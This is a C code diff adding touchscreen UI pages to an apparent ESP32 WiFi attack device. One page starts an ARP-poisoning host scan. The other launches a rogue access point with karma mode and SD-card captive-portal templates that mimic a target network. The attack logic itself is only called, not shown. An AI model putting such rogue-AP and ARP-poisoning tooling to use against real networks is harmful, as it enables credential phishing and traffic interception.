+static void arp_scan_check_timer_cb(lv_timer_t *timer)
+{
+    (void)timer;
+    if (arp_scan_done) {
+        arp_scan_done = false;
+        if (arp_scan_check_timer) {
+            lv_timer_del(arp_scan_check_timer);
+            arp_scan_check_timer = NULL;
+        }
+        arp_poison_show_host_table();
+    }
+}
 
 static void show_arp_poison_page(void)
 {
     create_function_page_base("ARP Poison");
     
-    lv_obj_t *title = lv_label_create(function_page);
-    lv_label_set_text(title, "ARP Poison");
-    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
-    lv_obj_set_style_text_color(title, COLOR_MATERIAL_TEAL, 0);
-    lv_obj_set_style_text_align(title, LV_TEXT_ALIGN_CENTER, 0);
-    lv_obj_center(title);
+    // Show scanning overlay
+    lv_obj_t *content = lv_obj_create(function_page);
+    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30);
+    lv_obj_align(content, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_color(content, lv_color_make(18, 18, 18), 0);
+    lv_obj_set_style_border_width(content, 0, 0);
+    lv_obj_set_style_radius(content, 0, 0);
+    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLLABLE);
+    
+    lv_obj_t *spinner = lv_spinner_create(content, 1000, 60);
+    lv_obj_set_size(spinner, 50, 50);
+    lv_obj_align(spinner, LV_ALIGN_CENTER, 0, -20);
+    
+    lv_obj_t *scan_label = lv_label_create(content);
+    lv_label_set_text(scan_label, "Scanning network for hosts...");
+    lv_obj_set_style_text_color(scan_label, COLOR_MATERIAL_TEAL, 0);
+    lv_obj_set_style_text_font(scan_label, &lv_font_montserrat_16, 0);
+    lv_obj_align(scan_label, LV_ALIGN_CENTER, 0, 30);
+    
+    // Start ARP scan task
+    arp_scan_done = false;
+    xTaskCreate(arp_scan_task, "arp_scan", 4096, NULL, 5, NULL);
+    
+    // Start timer to check when scan is done
+    arp_scan_check_timer = lv_timer_create(arp_scan_check_timer_cb, 200, NULL);
+}
+
+static void rogue_ap_exit_cb(lv_event_t *e)
+{
+    (void)e;
+    wifi_attacks_stop_portal();
+    wifi_attacks_set_evil_twin_event_cb(NULL);
+    rogue_ap_status_list = NULL;
+    nav_to_menu_flag = true;
+}
+
+static void rogue_ap_start_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    
+    if (!rogue_ap_html_dd || rogue_ap_html_count == 0) return;
+    
+    int html_sel = lv_dropdown_get_selected(rogue_ap_html_dd);
+    if (html_sel >= rogue_ap_html_count) return;
+    
+    int html_index = rogue_ap_html_map[html_sel];
+    esp_err_t html_res = wifi_attacks_select_sd_html(html_index);
+    if (html_res != ESP_OK) {
+        ESP_LOGW(TAG, "Failed to load HTML template");
+    }
+    
+    // Create running page
+    create_function_page_base("Rogue AP Active");
+    
+    lv_obj_t *content = lv_obj_create(function_page);
+    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30);
+    lv_obj_align(content, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_color(content, lv_color_make(18, 18, 18), 0);
+    lv_obj_set_style_border_width(content, 0, 0);
+    lv_obj_set_style_radius(content, 0, 0);
+    lv_obj_set_style_pad_all(content, 5, 0);
+    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    
+    // Network info
+    lv_obj_t *ssid_lbl = lv_label_create(content);
+    char ssid_text[64];
+    snprintf(ssid_text, sizeof(ssid_text), "AP: %s (WPA2)", wifi_connect_ssid);
+    lv_label_set_text(ssid_lbl, ssid_text);
+    lv_obj_set_style_text_color(ssid_lbl, COLOR_MATERIAL_INDIGO, 0);
+    lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_14, 0);
+    
+    // Status list
+    rogue_ap_status_list = lv_list_create(content);
+    lv_obj_set_size(rogue_ap_status_list, lv_pct(100), LV_SIZE_CONTENT);
+    lv_obj_set_flex_grow(rogue_ap_status_list, 1);
+    lv_obj_set_style_bg_color(rogue_ap_status_list, lv_color_make(25, 25, 25), 0);
+    lv_obj_set_style_border_color(rogue_ap_status_list, lv_color_make(50, 50, 50), 0);
+    lv_obj_set_style_border_width(rogue_ap_status_list, 1, 0);
+    lv_obj_set_style_radius(rogue_ap_status_list, 8, 0);
+    lv_obj_set_style_pad_all(rogue_ap_status_list, 4, 0);
+    
+    // Exit button
+    lv_obj_t *exit_btn = lv_btn_create(content);
+    lv_obj_set_size(exit_btn, 120, 36);
+    lv_obj_set_style_bg_color(exit_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_opa(exit_btn, LV_OPA_COVER, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(exit_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
+    lv_obj_set_style_text_color(exit_btn, lv_color_make(255, 255, 255), 0);
+    lv_obj_set_style_border_width(exit_btn, 0, 0);
+    lv_obj_set_style_radius(exit_btn, 8, 0);
+    lv_obj_t *exit_lbl = lv_label_create(exit_btn);
+    lv_label_set_text(exit_lbl, "Stop & Exit");
+    lv_obj_set_style_text_font(exit_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_center(exit_lbl);
+    lv_obj_add_event_cb(exit_btn, rogue_ap_exit_cb, LV_EVENT_CLICKED, NULL);
+    
+    // Set up event queue
+    if (!rogue_ap_event_queue) {
+        rogue_ap_event_queue = xQueueCreate(16, sizeof(evil_twin_event_data_t));
+    } else {
+        xQueueReset(rogue_ap_event_queue);
+    }
+    
+    wifi_attacks_set_evil_twin_event_cb(rogue_ap_ui_event_callback);
+    wifi_attacks_set_karma_mode(true);
+    
+    // Start the rogue AP
+    esp_err_t start_res = wifi_attacks_start_rogue_ap(wifi_connect_ssid, wifi_connect_password);
+    if (start_res != ESP_OK) {
+        rogue_ap_add_status_message("Failed to start Rogue AP", lv_color_make(255, 100, 100));
+        wifi_attacks_set_evil_twin_event_cb(NULL);
+    }
 }
 
 static void show_rogue_ap_page(void)
 {
-    create_function_page_base("Rogue AP");
+    esp_err_t sd_ret = ensure_sd_mounted();
+    if (sd_ret != ESP_OK) {
+        ESP_LOGW(TAG, "[ROGUE_AP_PAGE] SD card not available: %s", esp_err_to_name(sd_ret));
+    }
     
-    lv_obj_t *title = lv_label_create(function_page);
-    lv_label_set_text(title, "Rogue AP");
-    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
-    lv_obj_set_style_text_color(title, COLOR_MATERIAL_INDIGO, 0);
-    lv_obj_set_style_text_align(title, LV_TEXT_ALIGN_CENTER, 0);
-    lv_obj_center(title);
+    create_function_page_base("Rogue AP");
+    wifi_attacks_refresh_sd_html_list();
+    
+    rogue_ap_content = lv_obj_create(function_page);
+    lv_obj_set_size(rogue_ap_content, lv_pct(100), LCD_V_RES - 30);
+    lv_obj_align(rogue_ap_content, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_color(rogue_ap_content, lv_color_make(18, 18, 18), 0);
+    lv_obj_set_style_border_width(rogue_ap_content, 0, 0);
+    lv_obj_set_style_radius(rogue_ap_content, 0, 0);
+    lv_obj_set_style_pad_all(rogue_ap_content, 10, 0);
+    lv_obj_set_flex_flow(rogue_ap_content, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(rogue_ap_content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    
+    // Network info
+    lv_obj_t *net_label = lv_label_create(rogue_ap_content);
+    char net_text[80];
+    snprintf(net_text, sizeof(net_text), "Network: %s", wifi_connect_ssid);
+    lv_label_set_text(net_label, net_text);
+    lv_obj_set_style_text_color(net_label, COLOR_MATERIAL_INDIGO, 0);
+    lv_obj_set_style_text_font(net_label, &lv_font_montserrat_14, 0);
+    
+    // HTML Portal dropdown
+    lv_obj_t *html_label = lv_label_create(rogue_ap_content);
+    lv_label_set_text(html_label, "Captive Portal HTML");
+    lv_obj_set_style_text_color(html_label, lv_color_make(180, 180, 180), 0);
+    lv_obj_set_style_text_font(html_label, &lv_font_montserrat_12, 0);
+    
+    rogue_ap_html_dd = lv_dropdown_create(rogue_ap_content);
+    lv_obj_set_width(rogue_ap_html_dd, lv_pct(90));
+    lv_obj_set_style_bg_color(rogue_ap_html_dd, lv_color_make(40, 40, 40), 0);
+    lv_obj_set_style_text_color(rogue_ap_html_dd, lv_color_make(220, 220, 220), 0);
+    lv_obj_set_style_border_color(rogue_ap_html_dd, lv_color_make(80, 80, 80), 0);
+    lv_dropdown_set_dir(rogue_ap_html_dd, LV_DIR_BOTTOM);
+    
+    // Populate HTML dropdown
+    rogue_ap_html_count = 0;
+    int html_total = wifi_attacks_get_sd_html_count();
+    size_t max_html = (html_total < 64) ? html_total : 64;
+    size_t html_buf_size = (max_html > 0 ? max_html : 1) * 64;
+    char *html_options = (char *)lv_mem_alloc(html_buf_size);
+    if (!html_options) {
+        html_options = NULL;
+        max_html = 0;
+    }
+    
+    size_t html_len = 0;
+    if (html_options) html_options[0] = '\0';
+    
+    for (int i = 0; i < html_total && i < 64; i++) {
+        const char *name = wifi_attacks_get_sd_html_name(i);
+        if (!name) continue;
+        char entry[64];
+        const char *display = strrchr(name, '/');
+        if (display) display++; else display = name;
+        snprintf(entry, sizeof(entry), "%s\n", display);
+        size_t entry_len = strlen(entry);
+        if (html_options && html_len + entry_len < html_buf_size) {
+            memcpy(html_options + html_len, entry, entry_len);
+            html_len += entry_len;
+            html_options[html_len] = '\0';
+            rogue_ap_html_map[rogue_ap_html_count++] = i;
+        }
+    }
+    
+    if (rogue_ap_html_count == 0) {
+        lv_dropdown_set_options(rogue_ap_html_dd, "No HTML templates");
+    } else {
+        lv_dropdown_set_options(rogue_ap_html_dd, html_options);
+    }
+    lv_dropdown_set_selected(rogue_ap_html_dd, 0);
+    if (html_options) lv_mem_free(html_options);
+    
+    // Start button
+    rogue_ap_start_btn = lv_btn_create(rogue_ap_content);
+    lv_obj_set_size(rogue_ap_start_btn, 200, 44);
+    lv_obj_set_style_bg_color(rogue_ap_start_btn, COLOR_MATERIAL_INDIGO, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_opa(rogue_ap_start_btn, LV_OPA_COVER, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(rogue_ap_start_btn, lv_color_lighten(COLOR_MATERIAL_INDIGO, 30), LV_STATE_PRESSED);
+    lv_obj_set_style_bg_color(rogue_ap_start_btn, lv_color_make(60, 60, 60), LV_STATE_DISABLED);
+    lv_obj_set_style_text_color(rogue_ap_start_btn, lv_color_make(255, 255, 255), 0);
+    lv_obj_set_style_border_width(rogue_ap_start_btn, 0, 0);
+    lv_obj_set_style_radius(rogue_ap_start_btn, 8, 0);
+    lv_obj_t *start_label = lv_label_create(rogue_ap_start_btn);
+    lv_label_set_text(start_label, "Start Rogue AP");
+    lv_obj_set_style_text_font(start_label, &lv_font_montserrat_16, 0);
+    lv_obj_center(start_label);
+    lv_obj_add_event_cb(rogue_ap_start_btn, rogue_ap_start_btn_cb, LV_EVENT_CLICKED, NULL);
+    
+    if (rogue_ap_html_count == 0) {
+        lv_obj_add_state(rogue_ap_start_btn, LV_STATE_DISABLED);
+    }
 }
 
 static void show_wpa_sec_upload_page(void)
